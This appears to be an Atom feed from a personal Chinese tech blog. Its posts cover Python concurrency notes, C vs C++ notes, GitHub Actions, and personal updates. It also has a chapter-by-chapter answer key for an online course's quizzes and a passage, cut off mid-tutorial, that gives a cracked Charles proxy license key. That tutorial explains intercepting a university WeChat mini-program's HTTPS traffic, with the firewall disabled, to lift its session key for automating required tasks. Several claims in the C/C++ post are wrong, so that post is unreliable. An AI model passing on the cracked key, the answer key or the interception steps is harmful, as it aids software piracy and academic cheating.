    <summary type="html">&lt;h5 id=&quot;这篇文章就是来吐槽musedash的！&quot;&gt;&lt;a href=&quot;#这篇文章就是来吐槽musedash的！&quot; class=&quot;headerlink&quot; title=&quot;这篇文章就是来吐槽musedash的！&quot;&gt;&lt;/a&gt;这篇文章就是来吐槽musedash的！&lt;/h5&gt;&lt;p&gt;该死</summary>
      
    
    
    
    <category term="资源" scheme="https://liu1272.github.io/categories/%E8%B5%84%E6%BA%90/"/>
    
    
    <category term="资源" scheme="https://liu1272.github.io/tags/%E8%B5%84%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>基于Python的四程理解</title>
    <link href="https://liu1272.github.io/2023/03/04/%E5%9F%BA%E4%BA%8EPython%E7%9A%84%E5%9B%9B%E7%A8%8B%E7%90%86%E8%A7%A3/"/>
    <id>https://liu1272.github.io/2023/03/04/%E5%9F%BA%E4%BA%8EPython%E7%9A%84%E5%9B%9B%E7%A8%8B%E7%90%86%E8%A7%A3/</id>
    <published>2023-03-03T17:35:00.000Z</published>
    <updated>2023-03-03T18:34:09.617Z</updated>
    
    <content type="html"><![CDATA[<h4 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h4><p>网络编程，几乎所有网络的通信本质上都是通过socket模块实现。<br>并发编程，将串行的程序变为并发,提升代码执行的效率。<br>线程是计算机中可以被cpu调度的最小单元(真正在工作）。<br>进程是计算机资源分配的最小单元（进程为线程提供资源）。<br>一个进程中可以有多个线程,同一个进程中的线程可以共享此进程中的资源。</p><h4 id="GIL"><a href="#GIL" class="headerlink" title="GIL"></a>GIL</h4><p>CPython解释器特有的全局解释器锁，让一个进程中同一个时刻只能有一个线程可以被CPU调用。<br>因为多进程的成本比多线程的成本高，所以建议计算密集型用多进程；IO密集型用多线程。<br>同时创建进程数建议与CPU个数相同，合理创建线程数</p><h4 id="多线程开发"><a href="#多线程开发" class="headerlink" title="多线程开发"></a>多线程开发</h4><pre><code>import threadinglock_object = threading.RLock()def task(arg):    lock_object.acquire() # 加锁    pass    lock_object.release() # 释放锁        # 创建一个Thread对象（线程），并封装线程被CPU调度时应该执行的任务和相关参数。    t = threading.Thread(target=task,args=(&#39;xxx&#39;,))        #设置为守护线程，主线程执行完毕后，子线程也自动关闭。    #默认设置为非守护线程，主线程等待子线程，子线程执行完毕后，主线程才结束。    #守护线程必须在start之前    t.setDaemon(True/False)        # 线程准备就绪（等待CPU调度），代码继续向下执行。    t.start()    # 等待当前线程的任务执行完毕后再向下继续执行。    t.join()print(&quot;继续执行...&quot;) # 主线程执行完所有代码，不结束（等待子线程）</code></pre><h4 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h4><p>在程序中手动加锁方法：同步锁Lock和递归锁RLock。<br>RLock支持多次申请锁和多次释放；Lock不支持。<br>死锁————由于竞争资源或者由于彼此通信而造成的一种阻塞的现象。<br>有些操作默认都是线程安全的，使用的时无需再通过锁再处理</p><pre><code>import threadinglock_object = threading.RLock()def task(arg):    lock_object.acquire() # 加锁（令其它的等待）    pass    lock_object.release() # 释放锁（继续其它的任务）//或者使用with lock_object自动执行 acquire 和 release</code></pre><h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><pre><code>import timefrom concurrent.futures import ThreadPoolExecutor# pool = ThreadPoolExecutor(100)# pool.submit(函数名,参数1，参数2，参数...)def task(video_url,num):    print(&quot;开始执行任务&quot;, video_url)    time.sleep(5)# 创建线程池，最多维护10个线程。pool = ThreadPoolExecutor(10)url_list = []for url in url_list:    # 在线程池中提交一个任务，线程池中如果有空闲线程，则分配一个线程去执行，执行完毕后再将线程交还给线程池；如果没有空闲线程，则等待。    pool.submit(task, url,2)    print(&quot;END&quot;)</code></pre><h4 id="多进程开发"><a href="#多进程开发" class="headerlink" title="多进程开发"></a>多进程开发</h4><p>关于在Python中基于multiprocessiong模块操作的进程：<br><em>fork</em>，【unix】【任意位置开始】【快】<br><em>spawn</em>，【unix、win】【main代码块开始】【慢】<br><em>forkserver</em>，【部分unix】【main代码块开始】</p><pre><code>import multiprocessingfrom multiprocessing import Processmultiprocessing.set_start_method(&quot;spawn&quot;)   #选择操作进程def task():    passif __name__ == &#39;__main__&#39;:    #当前进程准备就绪，等待被CPU调度（工作单元其实是进程中的线程）    p1 = multiprocessing.Process(target=task)        #设置为守护线程，主线程执行完毕后，子线程也自动关闭。    #默认设置为非守护线程，主线程等待子线程，子线程执行完毕后，主线程才结束。    #守护线程必须在start之前    p.daemon(True/False)        p1.start()    #等待当前进程的任务执行完毕后再向下继续执行    p.join()    #这两行一定要放在初始化之后</code></pre><h4 id="进程锁-amp-进程池"><a href="#进程锁-amp-进程池" class="headerlink" title="进程锁&amp;进程池"></a>进程锁&amp;进程池</h4><p><em><strong>概念与用法与线程相似</strong></em><br>如果在进程池中要使用进程锁，则需要基于Manager中的Lock和RLock来实现。</p><h4 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h4><p>协程（Coroutine），是程序员通过代码搞出来的一个东西（非真实存在）。<br>协程也可以被称为微线程，是一种用户态内的上下文切换技术。<br>简而言之，其实就是通过一个线程实现代码块相互切换执行（来回跳着执行）。<br>协程比线程更加节省开销，但协程的开发难度大一些。</p><pre><code>&lt;案例&gt;【greenlet】from greenlet import greenletdef func1():    print(1)        # 第1步：输出 1    gr2.switch()    # 第3步：切换到 func2 函数    print(2)        # 第6步：输出 2    gr2.switch()    # 第7步：切换到 func2 函数，从上一次执行的位置继续向后执行def func2():    print(3)        # 第4步：输出 3    gr1.switch()    # 第5步：切换到 func1 函数，从上一次执行的位置继续向后执行    print(4)        # 第8步：输出 4gr1 = greenlet(func1)gr2 = greenlet(func2)gr1.switch() # 第1步：去执行 func1 函数【yield】from yield import yielddef func1():    yield 1    yield from func2()    yield 2def func2():    yield 3    yield 4f1 = func1()for item in f1:    print(item)</code></pre><p>让线程更加有意义:遇到IO请求时自动化切换（异步代码）</p><pre><code>&lt;案例&gt;import asyncioasync def func1():    print(1)    await asyncio.sleep(2)    print(2)    async def func2():    print(3)    await asyncio.sleep(2)    print(4)    tasks = [    asyncio.ensure_future(func1()),    asyncio.ensure_future(func2())]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks))</code></pre><p>写完这些已经很晚了，早上有时间再搞个异步代码和装饰器的文章吧。</p><h3 id="每日一句（多久没写了？）"><a href="#每日一句（多久没写了？）" class="headerlink" title="每日一句（多久没写了？）"></a>每日一句（多久没写了？）</h3><h5 id="其实“正常”才是无数误差交织中的碰巧完美。"><a href="#其实“正常”才是无数误差交织中的碰巧完美。" class="headerlink" title="其实“正常”才是无数误差交织中的碰巧完美。"></a>其实“正常”才是无数误差交织中的碰巧完美。</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;总述&quot;&gt;&lt;a href=&quot;#总述&quot; class=&quot;headerlink&quot; title=&quot;总述&quot;&gt;&lt;/a&gt;总述&lt;/h4&gt;&lt;p&gt;网络编程，几乎所有网络的通信本质上都是通过socket模块实现。&lt;br&gt;并发编程，将串行的程序变为并发,提升代码执行的效率。&lt;br&gt;线程是计</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>C&amp;C++</title>
    <link href="https://liu1272.github.io/2023/03/03/C-C/"/>
    <id>https://liu1272.github.io/2023/03/03/C-C/</id>
    <published>2023-03-02T16:27:00.000Z</published>
    <updated>2023-03-10T11:39:19.595Z</updated>
    
    <content type="html"><![CDATA[<h4 id="C和C-的部分差别"><a href="#C和C-的部分差别" class="headerlink" title="C和C++的部分差别"></a>C和C++的部分差别</h4><h5 id="1-存储类"><a href="#1-存储类" class="headerlink" title="1.存储类"></a>1.存储类</h5><p><em>存储类定义程序</em>中变量/函数的范围（可见性）和生命周期。<br>C++比较C多了mutable和thread_local类型</p><pre><code>mutable 说明符仅适用于类的对象，使用 thread_local 说明符声明的变量仅可在它在其上创建的线程上访问。 </code></pre><p>注意:<br>从 C++ 17 开始，auto 关键字不再是 C++ 存储类说明符，且 register 关键字被弃用。<br>thread_local用于C++11</p><h5 id="2-函数参数的调用"><a href="#2-函数参数的调用" class="headerlink" title="2.函数参数的调用"></a>2.函数参数的调用</h5><p>C++可以指针调用。<br>该方法把参数的地址赋值给形式参数。在函数内，该地址用于访问调用中要用到的实际参数。这意味着，修改形式参数会影响实际参数。<br>C不可以使用指针调用。</p><h5 id="3-指针"><a href="#3-指针" class="headerlink" title="3.指针"></a>3.指针</h5><p>C++比较C能够支持空指针。NULL 指针是一个定义在标准库中的值为零的常量。</p><h5 id="4-头文件"><a href="#4-头文件" class="headerlink" title="4.头文件"></a>4.头文件</h5><pre><code>【C】#include &lt;stdio.h&gt;      引用系统头文件。它在系统目录的标准列表中搜索名为 file 的文件。#include &quot;xxxxx&quot;        引用用户头文件。它在包含当前文件的目录中搜索名为 file 的文件。【C++】 头文件      函数和描述iostream    该文件定义了 cin、cout、cerr 和 clog 对象，分别对应于标准输入流、标准输出流、非缓冲标准错误流和缓冲标准错误流。iomanip     该文件通过所谓的参数化的流操纵器（比如 setw 和 setprecision），来声明对执行标准化 I/O 有用的服务。fstream     该文件为用户控制的文件处理声明服务。我们将在文件和流的相关章节讨论它的细节。</code></pre><h5 id="5-输入输出"><a href="#5-输入输出" class="headerlink" title="5.输入输出"></a>5.输入输出</h5><pre><code>            【C】        【C++】标准输入    stdin          cin           键盘标准输出    stdout         cout          屏幕标准错误    stderr         cerr          您的屏幕</code></pre><h6 id="6-文件读写"><a href="#6-文件读写" class="headerlink" title="6.文件读写"></a>6.文件读写</h6><p>C与C++的文件操作都属于面向对象，使用起来较为繁琐，需要记住很多函数。<br>对文件的操作都分为三个步骤:打开文件&gt;操作文件&gt;关闭文件</p><pre><code>【C】FILE *fopen( const char *filename, const char *mode );//要打开的文件名,不指定路径,则在当前文件夹找//打开的模式 读r 写w 或追加a//返回值:打开失败返回NULL,打开成功则返回指向文件的标识符int fputc( int c, FILE *fp );//写入文件int fclose( FILE *fp );//关闭文件【C++】int main() &#123;    fstream file;    file.open(&quot;filename&quot;,ios::mode); //以只写模式打开文件    char buf[] = &quot;内容&quot;;    file.write(buf,sizeof(buf));       //写入文件末尾    file.read(buf,mode);              //读文件    file.close();                      //关闭文件&#125;//modeapp      每次写入前寻位到流结尾binary   以二进制模式打开in       以读打开out      以写打开trunc    在打开时舍弃流的内容ate      打开后立即寻位到流结尾</code></pre><h6 id="7-异常处理"><a href="#7-异常处理" class="headerlink" title="7.异常处理"></a>7.异常处理</h6><p>C++有一个应对出现错误的机制，叫做异常处理。当程序运行发生错误时，可以抛出一个异常，异常处理程序会捕捉它并采取相应的措施。C语言并没有内置的异常机制。</p><h5 id="8-编译器"><a href="#8-编译器" class="headerlink" title="8.编译器"></a>8.编译器</h5><p>C语言和C++语言的编译器可不同。尽管有些编译器支持两种语言，但某些特征可能仅仅由一个语言所支持。</p><h5 id="9-名称空间"><a href="#9-名称空间" class="headerlink" title="9.名称空间"></a>9.名称空间</h5><p>C++有一个关键字叫做namespace，用于区分相同名称的函数和变量。C语言中没有这个特性。</p><h5 id="10-头文件"><a href="#10-头文件" class="headerlink" title="10.头文件"></a>10.头文件</h5><p>在C++中，头文件可以有任何扩展名，而在C语言中，它们必须是.h扩展名。</p><h5 id="11-默认变量初始化"><a href="#11-默认变量初始化" class="headerlink" title="11.默认变量初始化"></a>11.默认变量初始化</h5><p>在C++中，类的成员变量默认情况下会被初始化。而在C语言中，变量的内容是未定义的，程序可能会因此出现意外错误。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>C++语言是C语言的扩展，它包含了所有C语言的特性，并增加了一些特有的特性。C++是一个更为现代化的语言，用于更复杂的编程环境，特别是当需要面向对象编程时，C++是首选语言。而C语言则侧重于系统编程，嵌入式编程等。</p><h5 id="我只是刚开始学习C与C-，如果发现错误请在Github仓库中找到我。"><a href="#我只是刚开始学习C与C-，如果发现错误请在Github仓库中找到我。" class="headerlink" title="我只是刚开始学习C与C++，如果发现错误请在Github仓库中找到我。"></a>我只是刚开始学习C与C++，如果发现错误请在Github仓库中找到我。</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;C和C-的部分差别&quot;&gt;&lt;a href=&quot;#C和C-的部分差别&quot; class=&quot;headerlink&quot; title=&quot;C和C++的部分差别&quot;&gt;&lt;/a&gt;C和C++的部分差别&lt;/h4&gt;&lt;h5 id=&quot;1-存储类&quot;&gt;&lt;a href=&quot;#1-存储类&quot; class=&quot;head</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>UOOC中国近现代史纲要答案</title>
    <link href="https://liu1272.github.io/2023/02/20/UOOC%E4%B8%AD%E5%9B%BD%E8%BF%91%E4%BB%A3%E5%8F%B2%E7%BA%B2%E8%A6%81%E7%AD%94%E6%A1%88/"/>
    <id>https://liu1272.github.io/2023/02/20/UOOC%E4%B8%AD%E5%9B%BD%E8%BF%91%E4%BB%A3%E5%8F%B2%E7%BA%B2%E8%A6%81%E7%AD%94%E6%A1%88/</id>
    <published>2023-02-20T13:53:00.000Z</published>
    <updated>2023-03-03T12:12:11.899Z</updated>
    
    <content type="html"><![CDATA[<h5 id="此文章答案仅为个人记录所用，请勿用于其他用途"><a href="#此文章答案仅为个人记录所用，请勿用于其他用途" class="headerlink" title="此文章答案仅为个人记录所用，请勿用于其他用途"></a><em>此文章答案仅为个人记录所用，请勿用于其他用途</em></h5><h5 id="不保证完全一致，极可能存在多套题组，请核对后再查看"><a href="#不保证完全一致，极可能存在多套题组，请核对后再查看" class="headerlink" title="不保证完全一致，极可能存在多套题组，请核对后再查看"></a>不保证完全一致，极可能存在多套题组，请核对后再查看</h5><h5 id="tip：PC网页版刷新后是另一套题组"><a href="#tip：PC网页版刷新后是另一套题组" class="headerlink" title="tip：PC网页版刷新后是另一套题组"></a>tip：PC网页版刷新后是另一套题组</h5><h4 id="第1章"><a href="#第1章" class="headerlink" title="第1章"></a>第1章</h4><p>单选<br>1-5:CCABB<br>6-10:DCBDD<br>多选<br>11.AB<br>12-16:ABCD<br>17:BCD<br>18:ACD<br>19:AB<br>20.AB<br>判断<br>21-25:BABBB<br>26-30:BBBBB</p><h4 id="第2章"><a href="#第2章" class="headerlink" title="第2章"></a>第2章</h4><p>1-5:ACCDD<br>6-10:CCCBC<br>11:AB<br>12:ABCD<br>13:CD<br>14:BCD<br>15:ACD<br>16-17:ABCD<br>18:BC<br>19:ABCD<br>20:BCD<br>21-25:BBAAB<br>16-20:BAABB</p><h4 id="第3章"><a href="#第3章" class="headerlink" title="第3章"></a>第3章</h4><p>1-5:CBCCC<br>6:ABC<br>7:ABCE<br>8:ABCD<br>9:BCD<br>10:ACD<br>11:AD<br>12:AC<br>13:AB<br>14:BCD<br>15:ABCD<br>16-20:AABBA<br>21-25:BBAAA</p><h4 id="第4章"><a href="#第4章" class="headerlink" title="第4章"></a>第4章</h4><p>1-5:DAADC<br>6-10:AABAC<br>11:ABCDE<br>12:ABDE<br>13:ABCE<br>14:CD<br>15:AB<br>16-17:ABCD<br>18:DE<br>19:ABC<br>20:BC<br>21-25:ABBBA<br>26-30:AAABA</p><h4 id="第5章"><a href="#第5章" class="headerlink" title="第5章"></a>第5章</h4><p>1-5:CCABC<br>6:ABC<br>7:ABCDE<br>8:BCCD<br>9:AB<br>10:ABCD<br>11-12:ABCDE<br>13:ABC<br>14:BC<br>15:ABC<br>16-20:BBABA<br>21-25:BAABA</p><h4 id="第6章"><a href="#第6章" class="headerlink" title="第6章"></a>第6章</h4><p>1-5:CCCDC<br>6-8:ABCDE<br>9:ABC<br>10:ABCD<br>11:BCD<br>12:ABCD<br>13:AD<br>14:AB<br>15:ABC<br>16-20:AABAB<br>21-25:BAAAA</p><h4 id="第7章"><a href="#第7章" class="headerlink" title="第7章"></a>第7章</h4><p>1-5:BCDBB<br>6-10:DBBBD<br>11:ABCD<br>12:ABC<br>13:ACD<br>14:ABCDE<br>15:ABCD<br>16:ABC<br>17:CD<br>18:CD<br>19:CDE<br>20:ABD<br>21-25:AABBA<br>26-30:AAAAAA</p><h4 id="第8章"><a href="#第8章" class="headerlink" title="第8章"></a>第8章</h4><p>1-5:DCBBC<br>6-10:CCDAD<br>11:ABD<br>12:CDE<br>13:AB<br>14:ABCDE<br>15:ABCD<br>16:BCD<br>17:ABCDE<br>18:ABCD<br>19:ABD<br>20:AC<br>21-25:AAAAA<br>26-30:AAABA</p><h4 id="第9章"><a href="#第9章" class="headerlink" title="第9章"></a>第9章</h4><p>1-5:DBBDA<br>6-10:CBDDC<br>11:ABCDE<br>12-13:ABCD<br>14-16:ABCDE<br>17:ABC<br>18:ABCD<br>19:ABC<br>20-25:BBAAA<br>26-30:BABAA</p><h4 id="第10章"><a href="#第10章" class="headerlink" title="第10章"></a>第10章</h4><p>1-5:ACDCB<br>6-10:DDBBB<br>11:ABCDE<br>12:ABCD<br>13-14:ABCDE<br>15-16:ABCD<br>17:ABC<br>18:ABCD<br>19:ABC<br>20:BC<br>21-25:BBAAA<br>26-30:ABABA</p><h4 id="第11章（？）"><a href="#第11章（？）" class="headerlink" title="第11章（？）"></a>第11章（？）</h4><p>1-5:CCBAA<br>6-10:ACABC<br>11:ABC<br>12:ABCCD<br>13:ABCE<br>14:CDE<br>15-17:ABCD<br>18-19:ABCDE<br>20:ACE<br>21-25:AABAA<br>26-30:AAAAB</p><h3 id="不保证完全一致，极可能存在多套题组，请核对后再查看-1"><a href="#不保证完全一致，极可能存在多套题组，请核对后再查看-1" class="headerlink" title="不保证完全一致，极可能存在多套题组，请核对后再查看"></a>不保证完全一致，极可能存在多套题组，请核对后再查看</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;此文章答案仅为个人记录所用，请勿用于其他用途&quot;&gt;&lt;a href=&quot;#此文章答案仅为个人记录所用，请勿用于其他用途&quot; class=&quot;headerlink&quot; title=&quot;此文章答案仅为个人记录所用，请勿用于其他用途&quot;&gt;&lt;/a&gt;&lt;em&gt;此文章答案仅为个人记录所用，请勿</summary>
      
    
    
    
    <category term="闲聊" scheme="https://liu1272.github.io/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="闲聊" scheme="https://liu1272.github.io/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>Github Action初体验</title>
    <link href="https://liu1272.github.io/2023/02/02/20230202/"/>
    <id>https://liu1272.github.io/2023/02/02/20230202/</id>
    <published>2023-02-02T12:41:00.000Z</published>
    <updated>2023-03-03T11:17:09.894Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Github-Action"><a href="#Github-Action" class="headerlink" title="Github Action"></a>Github Action</h3><p>今天小小地了解了一下Github Action这个东西<br>感觉它实际上就是一个轻量级服务器而已<br>用户每个月有限制内存和运行时间，但是基本上不用担心用完</p><p>Action可以选择很多模板，也可以自己设置定时任务。<br>文件是yaml类型，语法不难理解<br>尝试几次就成功把以前那个该死的经典诵读文件做成一个定时任务了。</p><p>感觉很好的是密钥的添加很方便，也很好管理<br>但是，还是要翻旧账批评它没有一键删除history这个功能</p><p>这个定时任务文件代码放在这里了，有需要的自己改了用吧</p><pre><code># This workflow will install Python dependencies, run tests and lint with a single version of Python# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-pythonname: Python applicationon:  schedule:  # 定时任务，在每天的上午11点推送天气信息到邮箱    - cron: &#39;0 3 * * *&#39;    jobs:  build:    runs-on: ubuntu-latest    steps:    - uses: actions/checkout@v3    - name: Set up Python 3.10      uses: actions/setup-python@v3      with:        python-version: &quot;3.10&quot;            - name: Install dependencies      run: |        python -m pip install --upgrade pip        pip install flake8 pytest        pip3 install requests        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi            - name: RunScripts      run: |        # stop the build if there are Python syntax errors or undefined names        python 程序.py        # exit-zero treats all errors as warnings. The GitHub editor is 127 chars wide</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Github-Action&quot;&gt;&lt;a href=&quot;#Github-Action&quot; class=&quot;headerlink&quot; title=&quot;Github Action&quot;&gt;&lt;/a&gt;Github Action&lt;/h3&gt;&lt;p&gt;今天小小地了解了一下Github Action这个东</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>NoneBot2框架&amp;刷机小记</title>
    <link href="https://liu1272.github.io/2023/02/01/202301%E6%9C%88%E6%80%BB%E7%BB%93/"/>
    <id>https://liu1272.github.io/2023/02/01/202301%E6%9C%88%E6%80%BB%E7%BB%93/</id>
    <published>2023-02-01T12:20:00.000Z</published>
    <updated>2023-03-03T11:17:48.575Z</updated>
    
    <content type="html"><![CDATA[<p>半个月前，我一时兴起入坑QQbot，在go-cqhttp和nonebot2上接触到异步代码。<br>以及，在Python的异步代码里使用requests会堵塞这个问题。<br>自己写了点插件，也爬了很多api端口和网站。<br>本来想着在官网上也发布一个插件的，但是想想自己的臃肿的代码还是算了。<br><img src="https://s2.loli.net/2023/02/02/V57JDlnIgtaz2iq.png" alt="Bot长这样"><br><img src="https://s2.loli.net/2023/02/02/x8DAz94RnSQHZVJ.png" alt="查看服务器状态的插件"><br>近几天在玩刷机，拿个高通410的随身wifi刷了Debian。<br>超频到2.1GHz，同时释放了内存，现在它有这么大！<br><img src="https://s2.loli.net/2023/02/02/JeSaDVBqiMIc5yZ.png" alt="就问你离不离谱！"><br>你敢相信？他能跑上面所说的nonebot2<br>甚至能流畅运行1.8.8及更高版本的mc服务器！<br>今天下午试着用ZeroTier内网穿透，但是很可惜没做完。</p><p>由于17号要开学了，所以接下来还是多看看课本吧。<br>毕竟开学之后每周一从早八到晚上九点真的要命！！！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;半个月前，我一时兴起入坑QQbot，在go-cqhttp和nonebot2上接触到异步代码。&lt;br&gt;以及，在Python的异步代码里使用requests会堵塞这个问题。&lt;br&gt;自己写了点插件，也爬了很多api端口和网站。&lt;br&gt;本来想着在官网上也发布一个插件的，但是想想自己</summary>
      
    
    
    
    <category term="闲聊" scheme="https://liu1272.github.io/categories/%E9%97%B2%E8%81%8A/"/>
    
    
    <category term="闲聊" scheme="https://liu1272.github.io/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>新年快乐！</title>
    <link href="https://liu1272.github.io/2023/01/21/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%EF%BC%81/"/>
    <id>https://liu1272.github.io/2023/01/21/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%EF%BC%81/</id>
    <published>2023-01-21T13:15:00.000Z</published>
    <updated>2023-01-21T13:39:10.296Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2023/01/20/1R8PjGN5Baq7dJW.jpg" alt="随便写点东西"><br><img src="https://s2.loli.net/2023/01/20/PJjSVf2ZcrsplF6.png" alt="随便放点喜欢的图"><br><img src="https://s2.loli.net/2023/01/20/5QgoSpuZj8tzY4H.jpg" alt="过年就要做喜欢的事"><br><img src="https://s2.loli.net/2023/01/20/ASsKZNOHUvQ1oh3.jpg" alt="开心就好呐"><br><img src="https://s2.loli.net/2023/01/20/cUhNVqupKTbSa57.png" alt="过去没达到的目标"><br><img src="https://s2.loli.net/2023/01/20/QPysl5H9gJKNMY3.png" alt="就让它留在过去吧"><br><img src="https://s2.loli.net/2023/01/20/T5jayCcslFYtbG7.jpg" alt="但是现在立下的目标"><br><img src="https://s2.loli.net/2023/01/20/sDyIUJd1zkepg5H.jpg" alt="一定要为它负责啊！"></p><h6 id="小事记"><a href="#小事记" class="headerlink" title="小事记"></a>小事记</h6><p>本来打算在春节之前写完一个CVE的漏洞复现，但是写了一半才发现已经被师兄抢了！！！<br>师兄你不讲武德，抢了所有任务里最简单的一个哈哈哈。<br>没办法只能写另外一个CVE了，但是由于不是很懂java和c，所以理解很困难。<br>看了一堆大佬的文章之后终于搞明白了，也磕磕绊绊地大概写了一个exp<br>最后看到只能自己搭建漏洞环境来测试，这下就真的顶不住了……<br>现在我不打算继续搭建了，毕竟这样子做出来的成本太高，效果很差不说，跟我现在接触的知识还有些脱节。</p><h6 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h6><p>世界有长久事物，便是安慰。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2023/01/20/1R8PjGN5Baq7dJW.jpg&quot; alt=&quot;随便写点东西&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://s2.loli.net/2023/01/20/PJjSVf2ZcrsplF6.p</summary>
      
    
    
    
    <category term="随笔" scheme="https://liu1272.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="https://liu1272.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>有点意思~</title>
    <link href="https://liu1272.github.io/2023/01/12/20230112/"/>
    <id>https://liu1272.github.io/2023/01/12/20230112/</id>
    <published>2023-01-12T15:00:00.000Z</published>
    <updated>2023-03-03T11:18:34.664Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2023/01/12/HxhJLnMmr7TvGIX.png" alt="真正值得纪念的，或许不止是一张画片"><br><img src="https://s2.loli.net/2023/01/13/1vqJb5eflmtMFIp.png" alt="你见证了她的努力，此时就再守护她一会吧"><br><img src="https://s2.loli.net/2023/01/13/sCdprRjVKS1Gz3X.png" alt="想找出“恋爱”的公式，或许还需要一段时间"><br><img src="https://s2.loli.net/2023/01/13/SHhNsIKOYijGLuz.png" alt="玫瑰的意义，只存在于你我心中"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2023/01/12/HxhJLnMmr7TvGIX.png&quot; alt=&quot;真正值得纪念的，或许不止是一张画片&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://s2.loli.net/2023/01/13/1vqJb5</summary>
      
    
    
    
    <category term="随笔" scheme="https://liu1272.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="https://liu1272.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>经典诵读的正确打开方式</title>
    <link href="https://liu1272.github.io/2023/01/07/20220107/"/>
    <id>https://liu1272.github.io/2023/01/07/20220107/</id>
    <published>2023-01-06T16:08:00.000Z</published>
    <updated>2023-03-09T14:40:47.795Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><p>今天是广州某大学的wx小程序研究资料。<br>既然来了，那么话不多说，直接上教程<br>首先下载安装必备的应用<br><em>关于Python的安装和环境配置就不在这里赘述了</em><br><strong><a href="https://blog.csdn.net/qq_45502336/article/details/109531599?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167291320016800186585384%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=167291320016800186585384&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-9-109531599-null-null.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&utm_term=python&spm=1018.2226.3001.4187">Python传送门</a></strong><br><strong>Charles</strong><br>1.前往<a href="https://www.charlesproxy.com/download/">官网</a>下载安装最新版本<br><img src="https://s2.loli.net/2023/01/07/m1S8RCupIAgQyP9.png" alt="随便选个喜欢的"><br>2.在下图处输入<strong>pojie</strong>和<strong>9d8fb452d26c0decc5</strong>后确定<br><img src="https://s2.loli.net/2023/01/07/ZzpSn2uRG8BgIoA.png" alt="恭喜你解锁VIP"><br>3.点击HEIP-&gt;SSLProxying-&gt;Install Charles Root Certificate配置证书<br>4.点击【安装】，点击【下一步】，然后选【放入下列存储】，然后是【受信任的根证书颁发机构】<br>5.点击【Proxy】–&gt;【SSL Proxying Settings…】<br>6.勾选【Enable SSL Proxying】点击【add】，在Host输入【*】，在Prot输入【443】最后点击【ok】保存</p><h5 id="接下来是抓包"><a href="#接下来是抓包" class="headerlink" title="接下来是抓包"></a>接下来是抓包</h5><p>1.关闭防火墙:打开网络设置&gt;高级网络设置&gt;Windows防火墙&gt;公用网络&gt;关闭并确认<br>2.在PC端wx中打开该小程序<br>3.在任务管理器里找到该小程序的应用<br><img src="https://s2.loli.net/2023/01/07/meVHGjo6vDNUScL.png" alt="找到这个万恶之源！"><br>4.右键点开小程序，打开文件所在位置，找到一个叫Runtime的包<br>5.将小程序和微信都关闭掉（否则部分文件删除不掉），然后将Runtime包下的文件都删除掉<br>6.把Runtime文件夹改为只读状态<br><img src="https://s2.loli.net/2023/01/07/YtoPvDxO6Z8unwa.png" alt="就是这个"><br>7.重新进入该wx小程序登录<br>8.打开Charles后在小程序内随意进入一个页面<br>9.CTRL+F输入<strong>key</strong>找到并复制字段<br><img src="https://s2.loli.net/2023/01/07/ruwzPXvIG7AWCNB.png" alt="就类似于这样，不能放得更多了"></p><h5 id="最后开始让代码跑起来"><a href="#最后开始让代码跑起来" class="headerlink" 